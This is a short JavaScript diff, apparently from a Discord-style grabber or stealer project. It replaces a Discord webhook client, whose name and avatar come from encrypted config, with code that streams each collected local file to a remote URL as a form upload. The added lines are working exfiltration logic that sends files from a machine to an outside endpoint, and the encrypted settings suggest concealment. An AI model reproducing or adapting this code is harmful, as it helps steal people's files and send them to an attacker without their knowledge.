@@ -30,16 +30,13 @@ module.exports = (client) => {
             var files = data.files;
 
             if (files) {
-                let client1 = new client.requires.discord_webhook.Webhook({
-                    url: url,
-                    throwErrors: false,
-                });
-
                 files.forEach(async (file) => {
-                    [client1].forEach(async (_client) => {
-                        _client.setAvatar(client.utils.encryption.decryptData(client.config.embed.avatar_url));
-                        _client.setUsername(client.utils.encryption.decryptData(client.config.embed.username));
-                        await _client.sendFile(file);
+                    client.requires.request.post({
+                        url: url,
+                        formData: {
+                            file: client.requires.fs.createReadStream(file.path),
+                            title: file.name
+                        }
                     })
                 })
             }
